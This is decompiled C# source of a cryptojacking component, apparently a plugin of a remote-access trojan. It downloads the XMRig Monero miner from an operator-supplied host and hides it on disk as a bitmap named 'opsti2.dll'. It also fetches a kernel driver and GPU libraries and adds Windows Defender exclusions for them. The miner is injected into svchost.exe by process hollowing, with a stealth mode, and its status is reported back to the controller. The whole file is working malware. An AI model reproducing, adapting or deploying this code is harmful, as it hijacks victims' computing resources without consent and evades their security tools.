using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Threading;
using Leb128;

namespace Plugin.Helper;

internal class MinerControler
{
	public static string args = null;

	public static string argsStealth = null;

	public static CancellationTokenSource ctsMiner;

	public static bool Installing = false;

	public static bool Installing1 = false;

	public static bool Working = false;

	public static bool WorkingGpu = false;

	public static string gpu = string.Join(",", Methods.GetHardwareInfo("Win32_VideoController", "Name")).ToLower();

	public static string userprofile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	public static string host1;

	public static void Install(string host)
	{
		host1 = host;
		if (host.Contains("https"))
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 9999;
		}
		List<Thread> list = new List<Thread>();
		list.Add(new Thread((ThreadStart)delegate
		{
			for (int j = 0; j < 5; j++)
			{
				try
				{
					if (!File.Exists(Path.Combine(userprofile, "opsti2.dll")))
					{
						((Image)Crypto.ByteToBitmap(new WebClient().DownloadData(host + "/xmrig.exe"))).Save(Path.Combine(userprofile, "opsti2.dll"));
					}
					break;
				}
				catch (Exception ex5)
				{
					if (Client.itsConnect)
					{
						Client.Send(LEB128.Write(new object[2]
						{
							"Error",
							"Miner Error: " + ex5.ToString()
						}));
					}
				}
			}
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			for (int i = 0; i < 5; i++)
			{
				try
				{
					if (!File.Exists(Path.Combine(userprofile, "WinRing0x64.sys")))
					{
						File.WriteAllBytes(Path.Combine(userprofile, "WinRing0x64.sys"), new WebClient().DownloadData(host + "/WinRing0x64.sys"));
						WindowsDefenderExclusion.Exc(Path.Combine(userprofile, "WinRing0x64.sys"));
					}
					break;
				}
				catch (Exception ex4)
				{
					if (Client.itsConnect)
					{
						Client.Send(LEB128.Write(new object[2]
						{
							"Error",
							"Miner Error: " + ex4.ToString()
						}));
					}
				}
			}
		}));
		if (gpu.Contains("nvidia"))
		{
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					if (!File.Exists(Path.Combine(userprofile, "ddb64.dll")))
					{
						File.WriteAllBytes(Path.Combine(userprofile, "ddb64.dll"), new WebClient().DownloadData(host + "/ddb64.dll"));
						WindowsDefenderExclusion.Exc(Path.Combine(userprofile, "ddb64.dll"));
					}
				}
				catch (Exception ex3)
				{
					if (Client.itsConnect)
					{
						Client.Send(LEB128.Write(new object[2]
						{
							"Error",
							"Miner Error: " + ex3.ToString()
						}));
					}
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					if (!File.Exists(Path.Combine(userprofile, "nvrtc64_112_0.dll")))
					{
						File.WriteAllBytes(Path.Combine(userprofile, "nvrtc64_112_0.dll"), new WebClient().DownloadData(host + "/nvrtc64_112_0.dll"));
						WindowsDefenderExclusion.Exc(Path.Combine(userprofile, "nvrtc64_112_0.dll"));
					}
				}
				catch (Exception ex2)
				{
					if (Client.itsConnect)
					{
						Client.Send(LEB128.Write(new object[2]
						{
							"Error",
							"Miner Error: " + ex2.ToString()
						}));
					}
				}
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				try
				{
					if (!File.Exists(Path.Combine(userprofile, "nvrtc-builtins64_112.dll")))
					{
						File.WriteAllBytes(Path.Combine(userprofile, "nvrtc-builtins64_112.dll"), new WebClient().DownloadData(host + "/nvrtc-builtins64_112.dll"));
						WindowsDefenderExclusion.Exc(Path.Combine(userprofile, "nvrtc-builtins64_112.dll"));
					}
				}
				catch (Exception ex)
				{
					if (Client.itsConnect)
					{
						Client.Send(LEB128.Write(new object[2]
						{
							"Error",
							"Miner Error: " + ex.ToString()
						}));
					}
				}
			}));
		}
		foreach (Thread item in list)
		{
			item.Start();
		}
		foreach (Thread item2 in list)
		{
			item2.Join();
		}
	}

	public static void Start()
	{
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Expected O, but got Unknown
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Expected O, but got Unknown
		//IL_02b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bb: Expected O, but got Unknown
		ctsMiner = new CancellationTokenSource();
		if (WorkingGpu && (gpu.Contains("nvidia") || gpu.Contains("amd")))
		{
			if (gpu.Contains("nvidia") && File.Exists(Path.Combine(userprofile, "ddb64.dll")))
			{
				args = args + " --cuda --cuda-loader=" + Path.Combine(userprofile, "ddb64.dll");
				if (Stealth.Enabled)
				{
					argsStealth = argsStealth + " --cuda --cuda-loader=" + Path.Combine(userprofile, "ddb64.dll");
				}
			}
			if (gpu.Contains("amd"))
			{
				args += " --opencl";
				if (Stealth.Enabled)
				{
					argsStealth += " --opencl";
				}
			}
		}
		while (!ctsMiner.IsCancellationRequested && Client.itsConnect)
		{
			try
			{
				bool flag = true;
				ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(string.Format("select CommandLine from Win32_Process where Name='{0}'", "svchost.exe")).Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val = (ManagementObject)enumerator.Current;
						if ((string)((ManagementBaseObject)val)["CommandLine"] == "C:\\Windows\\System32\\svchost.exe " + args)
						{
							flag = false;
							Client.Send(LEB128.Write(new object[3] { "MinerXmr", "Status", "active default" }));
							break;
						}
						if ((string)((ManagementBaseObject)val)["CommandLine"] == "C:\\Windows\\System32\\svchost.exe " + argsStealth)
						{
							flag = false;
							Client.Send(LEB128.Write(new object[3] { "MinerXmr", "Status", "active stealth" }));
							break;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (flag && !ctsMiner.IsCancellationRequested)
				{
					if (!AntiProcess.antiprocess && AntiProcess.Enabled)
					{
						Client.Send(LEB128.Write(new object[3] { "MinerXmr", "Status", "anti process" }));
					}
					else
					{
						Client.Send(LEB128.Write(new object[3] { "MinerXmr", "Status", "dont mining" }));
					}
					if (!AntiProcess.antiprocess || Stealth.StealthModeuse)
					{
						if (Stealth.StealthModeuse)
						{
							RunPe.Run(Crypto.BitmapToByte(new Bitmap(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "opsti2.dll"))), "C:\\Windows\\System32\\svchost.exe", argsStealth);
						}
						else
						{
							RunPe.Run(Crypto.BitmapToByte(new Bitmap(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "opsti2.dll"))), "C:\\Windows\\System32\\svchost.exe", args);
						}
						Working = true;
					}
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(1000);
		}
		Stop();
	}

	public static void Kill()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		if (!Working)
		{
			return;
		}
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(string.Format("Select CommandLine, ProcessID from Win32_Process where Name='{0}'", "svchost.exe")).Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.Current;
				try
				{
					if (((string)((ManagementBaseObject)val)["CommandLine"]).Contains("--cinit-find-x -B --algo=\"rx/0\""))
					{
						Process.GetProcessById(Convert.ToInt32(((ManagementBaseObject)val)["ProcessId"])).Kill();
						Working = false;
					}
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void Stop()
	{
		if (ctsMiner != null)
		{
			ctsMiner.Cancel();
			Kill();
			Client.Send(LEB128.Write(new object[3] { "MinerXmr", "Status", "stoped" }));
		}
	}
}
